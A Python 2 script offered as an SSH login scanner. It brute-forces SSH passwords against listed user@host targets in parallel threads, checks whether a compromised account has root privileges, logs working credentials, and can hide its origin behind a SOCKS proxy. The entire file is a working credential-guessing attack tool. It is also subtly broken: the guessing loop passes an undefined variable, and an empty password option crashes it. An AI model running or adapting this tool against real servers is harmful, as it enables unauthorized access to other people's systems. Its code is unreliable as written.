#!/usr/bin/env python2

from threading import Thread
from Queue import Queue
import paramiko
import socks
import socket
import argparse
import signal
import requests
import sys
import re

printq = Queue()
targetq = Queue()

def check_server( host, user, pword ):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )
    try:
        ssh.connect( host, port=22, username=user, password=pword, timeout=10 )
        printq.put( "[+] Login success: {}:{}@{}".format( user, pword, host ) )
        ( stdin, stdout, stderr ) = ssh.exec_command( "id" )
        result = " ".join( [ line.rstrip( "\n" ) for line in stdout.readlines() ] ).rstrip( "\n" )
        if "uid=0" in result:
            status = "root privs"
            printq.put( "[+] Login success: {}:{}@{} - {}".format( user, pword, host, status ) )
        else:
            printq.put( "[+] Login success: {}:{}@{}".format( user, pword, host ) )
    except paramiko.AuthenticationException:
        printq.put( "[!] Login failed: {}:{}@{}".format( user, pword, host ) )
    except socket.error:
        printq.put( "[!] Socket Error... skipping: {}:{}@{}".format( user, pword, host ) )
    except paramiko.ssh_exception.SSHException:
        printq.put( "[!] Socket Error... skipping: {}:{}@{}".format( user, pword, host ) )
    except Exception as ERROR:
        printq.put( "[!] Error - {}... skipping: {}:{}@{}".format( ERROR, user, pword, host ) )
    ssh.close()

def scanner():
    while True:
        if targetq.empty() is not True:
            stub = targetq.get()
            target = re.match( r"(.+)@(.+)", stub )
            if target:
                for passwd in passwds:
                    user = target.group( 1 )
                    host = target.group( 2 )
                    check_server( host, user, pword )
            else:
                printq.put( "[!] Invalid target stub, skipping {}".format( stub ) )
            targetq.task_done()

def printer( logfile ):
    while True:
        if printq.empty() is not True:
            msg = printq.get()
            print msg
            if logfile is not None:
                with open( logfile, "a" ) as log:
                    log.write( "{}\n".format( msg ) )
                log.close()
            printq.task_done()

def signal_handler( signal, frame ):
    print "\n[!] Exiting..."
    sys.exit( 0 )

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser( "SSH Login scanner" )
    parser.add_argument( "--targets", "-t", required=True, help="list of user:pass@ipv4" )
    parser.add_argument( "--scanners", "-s", required=False, help="number of scanner threads" )
    parser.add_argument( "--logfile", "-l", required=False, help="logfile to save results to" )
    parser.add_argument( "--proxy", "-p", required=False, help="socks host:port to use" )
    parser.add_argument( "--wordlist", "-w", required=False, help="wordlist of passwords" )
    parser.add_argument( "--passwd", "-P", required=False, help="password to guess with" )
    
    args = vars( parser.parse_args() )

    targets = args["targets"] if args["targets"] else None
    scanners = int( args["scanners"] ) if args["scanners"] else 1
    logfile = args["logfile"] if args["logfile"] else None
    proxy = args["proxy"] if args["proxy"] else None
    
    if args["wordlist"]:
        passwds = [ x.rstrip( "\n" ) for x in open( args["wordlist"], "r" ).readlines() ]
    elif args["passwd"]:
        passwds = [ args["passwd"] ]
    else:
        passwds = None

    if proxy is not None:
        proxyhost = proxy.split( ":" )[0]
        proxyport = int( proxy.split( ":" )[1] )
        socks.set_default_proxy( socks.SOCKS5, proxyhost, proxyport )
        socket.socket = socks.socksocket
        try:
            test = requests.get( "http://icanhazip.com" ).text.rstrip( "\n\r" )
        except:
            print "[!] Proxy connection failed, exiting..."
            sys.exit( 1 )
        print "[+] Proxy connection succeeded, masking as {}".format( test )
        paramiko.client.socket.socket = socks.socksocket

    if len( passwds ) == 0:
        print "[!] Must have at least 1 password  to guess with"
        sys.exit( 1 )

    for i in xrange( scanners ):
        proc = Thread( target=scanner )
        proc.daemon = True
        proc.start()

    if targets is not None:
        for target in open( targets, "r" ).readlines():
            targetq.put( target.rstrip( "\n" ) )

    signal.signal( signal.SIGINT, signal_handler )

    proc = Thread( target=printer, args=( logfile, ) )
    proc.daemon = True
    proc.start()

    targetq.join()
    printq.join()
